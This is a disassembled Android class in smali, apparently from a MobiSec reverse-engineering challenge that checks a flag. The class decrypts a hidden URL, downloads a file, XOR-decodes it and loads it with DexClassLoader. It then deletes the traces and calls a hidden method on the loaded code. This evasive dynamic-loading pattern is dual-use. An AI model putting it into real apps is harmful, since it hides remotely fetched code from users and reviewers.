.class public Lcom/mobisec/dexclassloader/DoStuff;
.super Ljava/lang/Object;
.source "DoStuff.java"


# static fields
.field private static initVector:[B


# instance fields
.field private TAG:Ljava/lang/String;

.field private context:Landroid/content/Context;

.field private flag:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 30
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    sput-object v0, Lcom/mobisec/dexclassloader/DoStuff;->initVector:[B

    return-void

    :array_0
    .array-data 1
        -0x22t
        -0x53t
        -0x42t
        -0x11t
        -0x22t
        -0x53t
        -0x42t
        -0x11t
        -0x22t
        -0x53t
        -0x42t
        -0x11t
        -0x22t
        -0x53t
        -0x42t
        -0x11t
    .end array-data
.end method

.method public constructor <init>()V
    .locals 1

    .line 23
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 27
    const-string v0, "MAINAPP"

    iput-object v0, p0, Lcom/mobisec/dexclassloader/DoStuff;->TAG:Ljava/lang/String;

    return-void
.end method

.method private da(Ljava/lang/String;)V
    .locals 10
    .param p1, "path"    # Ljava/lang/String;

    .line 160
    iget-object v0, p0, Lcom/mobisec/dexclassloader/DoStuff;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    .line 161
    .local v0, "xorKey":[B
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 162
    .local v1, "file":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v2

    long-to-int v3, v2

    .line 163
    .local v3, "size":I
    new-array v2, v3, [B

    .line 164
    .local v2, "bytes":[B
    new-array v4, v3, [B

    .line 167
    .local v4, "decbytes":[B
    :try_start_0
    new-instance v5, Ljava/io/BufferedInputStream;

    new-instance v6, Ljava/io/FileInputStream;

    invoke-direct {v6, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v5, v6}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 168
    .local v5, "buf":Ljava/io/BufferedInputStream;
    array-length v6, v2

    const/4 v7, 0x0

    invoke-virtual {v5, v2, v7, v6}, Ljava/io/BufferedInputStream;->read([BII)I

    .line 169
    invoke-virtual {v5}, Ljava/io/BufferedInputStream;->close()V

    .line 170
    const/4 v6, 0x0

    .local v6, "i":I
    :goto_0
    if-ge v6, v3, :cond_0

    .line 171
    aget-byte v8, v2, v6

    array-length v9, v0

    rem-int v9, v6, v9

    aget-byte v9, v0, v9

    xor-int/2addr v8, v9

    int-to-byte v8, v8

    aput-byte v8, v4, v6

    .line 170
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    .line 175
    .end local v6    # "i":I
    :cond_0
    new-instance v6, Ljava/io/File;

    invoke-direct {v6, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 176
    .local v6, "outFile":Ljava/io/File;
    new-instance v8, Ljava/io/FileOutputStream;

    invoke-direct {v8, v6, v7}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;Z)V

    move-object v7, v8

    .line 177
    .local v7, "out":Ljava/io/FileOutputStream;
    invoke-virtual {v7, v4}, Ljava/io/FileOutputStream;->write([B)V

    .line 178
    invoke-virtual {v7}, Ljava/io/FileOutputStream;->flush()V

    .line 179
    invoke-virtual {v7}, Ljava/io/FileOutputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 184
    .end local v5    # "buf":Ljava/io/BufferedInputStream;
    .end local v6    # "outFile":Ljava/io/File;
    .end local v7    # "out":Ljava/io/FileOutputStream;
    goto :goto_1

    .line 182
    :catch_0
    move-exception v5

    .line 183
    .local v5, "e":Ljava/lang/Exception;
    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V

    .line 185
    .end local v5    # "e":Ljava/lang/Exception;
    :goto_1
    return-void
.end method

.method private dc(Ljava/lang/String;)Ljava/lang/String;
    .locals 9
    .param p1, "url"    # Ljava/lang/String;

    .line 84
    :try_start_0
    new-instance v0, Ljava/net/URL;

    invoke-direct {v0, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 85
    .local v0, "downloaded_url":Ljava/net/URL;
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;

    .line 86
    .local v1, "urlConnection":Ljava/net/HttpURLConnection;
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->connect()V

    .line 87
    iget-object v2, p0, Lcom/mobisec/dexclassloader/DoStuff;->context:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getCodeCacheDir()Ljava/io/File;

    move-result-object v2

    .line 88
    .local v2, "file":Ljava/io/File;
    new-instance v3, Ljava/io/File;

    invoke-direct {p0}, Lcom/mobisec/dexclassloader/DoStuff;->gf()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v2, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    move-object v2, v3

    .line 89
    new-instance v3, Ljava/io/FileOutputStream;

    invoke-direct {v3, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 90
    .local v3, "fileOutput":Ljava/io/FileOutputStream;
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    .line 91
    .local v4, "inputStream":Ljava/io/InputStream;
    const/16 v5, 0x400

    new-array v5, v5, [B

    .line 92
    .local v5, "buffer":[B
    nop

    const/4 v6, 0x0

    move v7, v6

    .line 93
    .local v7, "bufferLength":I
    :goto_0
    nop

    invoke-virtual {v4, v5}, Ljava/io/InputStream;->read([B)I

    move-result v8

    nop

    move v7, v8

    if-lez v8, :cond_0

    .line 94
    nop

    invoke-virtual {v3, v5, v6, v7}, Ljava/io/FileOutputStream;->write([BII)V

    nop

    goto :goto_0

    .line 96
    :cond_0
    nop

    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V

    .line 98
    nop

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    nop

    return-object v6

    .line 99
    .end local v0    # "downloaded_url":Ljava/net/URL;
    .end local v1    # "urlConnection":Ljava/net/HttpURLConnection;
    .end local v2    # "file":Ljava/io/File;
    .end local v3    # "fileOutput":Ljava/io/FileOutputStream;
    .end local v4    # "inputStream":Ljava/io/InputStream;
    .end local v5    # "buffer":[B
    .end local v7    # "bufferLength":I
    :catch_0
    move-exception v0

    nop

    .line 101
    .local v0, "e":Ljava/lang/Exception;
    nop

    const/4 v1, 0x0

    return-object v1
.end method

.method private ds(Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p1, "enc"    # Ljava/lang/String;

    .line 191
    :try_start_0
    iget-object v0, p0, Lcom/mobisec/dexclassloader/DoStuff;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    const-string v1, "."

    invoke-static {v1}, Ljava/util/regex/Pattern;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 192
    .local v0, "parts":[Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v2, 0x1

    aget-object v2, v0, v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v2, 0x0

    aget-object v3, v0, v2

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "key!!!"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 194
    .local v1, "key":Ljava/lang/String;
    new-instance v3, Ljavax/crypto/spec/IvParameterSpec;

    sget-object v4, Lcom/mobisec/dexclassloader/DoStuff;->initVector:[B

    invoke-direct {v3, v4}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V

    .line 195
    .local v3, "iv":Ljavax/crypto/spec/IvParameterSpec;
    new-instance v4, Ljavax/crypto/spec/SecretKeySpec;

    const-string v5, "UTF-8"

    invoke-virtual {v1, v5}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v5

    const-string v6, "AES"

    invoke-direct {v4, v5, v6}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 196
    .local v4, "skeySpec":Ljavax/crypto/spec/SecretKeySpec;
    const-string v5, "AES/CBC/PKCS5PADDING"

    invoke-static {v5}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v5

    .line 197
    .local v5, "cipher":Ljavax/crypto/Cipher;
    const/4 v6, 0x2

    invoke-virtual {v5, v6, v4, v3}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V

    .line 198
    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-static {v6, v2}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v2

    invoke-virtual {v5, v2}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v2

    .line 199
    .local v2, "original":[B
    new-instance v6, Ljava/lang/String;

    invoke-direct {v6, v2}, Ljava/lang/String;-><init>([B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v6

    .line 200
    .end local v0    # "parts":[Ljava/lang/String;
    .end local v1    # "key":Ljava/lang/String;
    .end local v2    # "original":[B
    .end local v3    # "iv":Ljavax/crypto/spec/IvParameterSpec;
    .end local v4    # "skeySpec":Ljavax/crypto/spec/SecretKeySpec;
    .end local v5    # "cipher":Ljavax/crypto/Cipher;
    :catch_0
    move-exception v0

    .line 201
    .local v0, "ex":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 202
    const/4 v1, 0x0

    return-object v1
.end method

.method private gc()Ljava/lang/String;
    .locals 1

    .line 55
    const-string v0, "ca9O9YbCZ/+vIYUvxPQUHA4SgyL/m3cwlvVZ4ArkBFQ="

    invoke-direct {p0, v0}, Lcom/mobisec/dexclassloader/DoStuff;->ds(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private gf()Ljava/lang/String;
    .locals 1

    .line 48
    const-string v0, "QLrdlqkhOkxIe5FEfpCLWw=="

    invoke-direct {p0, v0}, Lcom/mobisec/dexclassloader/DoStuff;->ds(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private gm()Ljava/lang/String;
    .locals 1

    .line 62
    const-string v0, "6RSjLOfRkvb/qXa34Y7cOQ=="

    invoke-direct {p0, v0}, Lcom/mobisec/dexclassloader/DoStuff;->ds(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private gu()Ljava/lang/String;
    .locals 1

    .line 39
    const-string v0, "MAi9CEe4K9a+JzgsNqdYYh13dk7SQQ/yo5BN5HF39nYtgnOBmO4EV9Y2sQDthTG9"

    invoke-direct {p0, v0}, Lcom/mobisec/dexclassloader/DoStuff;->ds(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 41
    .local v0, "url":Ljava/lang/String;
    return-object v0
.end method

.method private lc(Ljava/lang/String;)Z
    .locals 12
    .param p1, "path"    # Ljava/lang/String;

    .line 110
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/mobisec/dexclassloader/DoStuff;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 111
    .local v0, "tmpDir":Ljava/io/File;
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 112
    .local v1, "file":Ljava/io/File;
    const/4 v2, 0x0

    .line 113
    .local v2, "res":Z
    new-instance v3, Ldalvik/system/DexClassLoader;

    .line 114
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    .line 116
    invoke-static {}, Ljava/lang/ClassLoader;->getSystemClassLoader()Ljava/lang/ClassLoader;

    move-result-object v6

    const/4 v7, 0x0

    invoke-direct {v3, v4, v5, v7, v6}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    .line 118
    .local v3, "classloader":Ldalvik/system/DexClassLoader;
    invoke-virtual {v1}, Ljava/io/File;->delete()Z

    .line 119
    invoke-virtual {v0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v4

    .line 120
    .local v4, "ftemp":[Ljava/io/File;
    array-length v5, v4

    const/4 v6, 0x0

    const/4 v7, 0x0

    :goto_0
    if-ge v7, v5, :cond_0

    aget-object v8, v4, v7

    .line 121
    .local v8, "f":Ljava/io/File;
    invoke-virtual {v8}, Ljava/io/File;->delete()Z

    .line 120
    .end local v8    # "f":Ljava/io/File;
    add-int/lit8 v7, v7, 0x1

    goto :goto_0

    .line 125
    :cond_0
    :try_start_0
    invoke-direct {p0}, Lcom/mobisec/dexclassloader/DoStuff;->gc()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v5

    .line 127
    .local v5, "classToLoad":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    invoke-direct {p0}, Lcom/mobisec/dexclassloader/DoStuff;->gm()Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x2

    new-array v9, v8, [Ljava/lang/Class;

    const-class v10, Landroid/content/Context;

    aput-object v10, v9, v6

    const-class v10, Ljava/lang/String;

    const/4 v11, 0x1

    aput-object v10, v9, v11

    invoke-virtual {v5, v7, v9}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v7

    .line 128
    .local v7, "method":Ljava/lang/reflect/Method;
    new-array v8, v8, [Ljava/lang/Object;

    iget-object v9, p0, Lcom/mobisec/dexclassloader/DoStuff;->context:Landroid/content/Context;

    aput-object v9, v8, v6

    iget-object v6, p0, Lcom/mobisec/dexclassloader/DoStuff;->flag:Ljava/lang/String;

    aput-object v6, v8, v11

    invoke-virtual {v7, v5, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/Boolean;

    invoke-virtual {v6}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v6
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move v2, v6

    .line 131
    .end local v5    # "classToLoad":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v7    # "method":Ljava/lang/reflect/Method;
    goto :goto_1

    .line 129
    :catch_0
    move-exception v5

    .line 130
    .local v5, "e":Ljava/lang/Exception;
    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V

    .line 132
    .end local v5    # "e":Ljava/lang/Exception;
    :goto_1
    return v2
.end method

.method private setContext(Landroid/content/Context;)V
    .locals 0
    .param p1, "ctx"    # Landroid/content/Context;

    .line 73
    iput-object p1, p0, Lcom/mobisec/dexclassloader/DoStuff;->context:Landroid/content/Context;

    .line 75
    return-void
.end method

.method private setUserInput(Ljava/lang/String;)V
    .locals 0
    .param p1, "_flag"    # Ljava/lang/String;

    .line 67
    iput-object p1, p0, Lcom/mobisec/dexclassloader/DoStuff;->flag:Ljava/lang/String;

    .line 69
    return-void
.end method


# virtual methods
.method public start(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 3
    .param p1, "ctx"    # Landroid/content/Context;
    .param p2, "flag"    # Ljava/lang/String;

    .line 138
    new-instance v0, Landroid/os/StrictMode$ThreadPolicy$Builder;

    invoke-direct {v0}, Landroid/os/StrictMode$ThreadPolicy$Builder;-><init>()V

    invoke-virtual {v0}, Landroid/os/StrictMode$ThreadPolicy$Builder;->permitAll()Landroid/os/StrictMode$ThreadPolicy$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/os/StrictMode$ThreadPolicy$Builder;->build()Landroid/os/StrictMode$ThreadPolicy;

    move-result-object v0

    .line 139
    .local v0, "policy":Landroid/os/StrictMode$ThreadPolicy;
    invoke-static {v0}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V

    .line 142
    invoke-direct {p0, p1}, Lcom/mobisec/dexclassloader/DoStuff;->setContext(Landroid/content/Context;)V

    .line 145
    invoke-direct {p0, p2}, Lcom/mobisec/dexclassloader/DoStuff;->setUserInput(Ljava/lang/String;)V

    .line 148
    invoke-direct {p0}, Lcom/mobisec/dexclassloader/DoStuff;->gu()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, Lcom/mobisec/dexclassloader/DoStuff;->dc(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 151
    .local v1, "path":Ljava/lang/String;
    invoke-direct {p0, v1}, Lcom/mobisec/dexclassloader/DoStuff;->da(Ljava/lang/String;)V

    .line 154
    invoke-direct {p0, v1}, Lcom/mobisec/dexclassloader/DoStuff;->lc(Ljava/lang/String;)Z

    move-result v2

    return v2
.end method
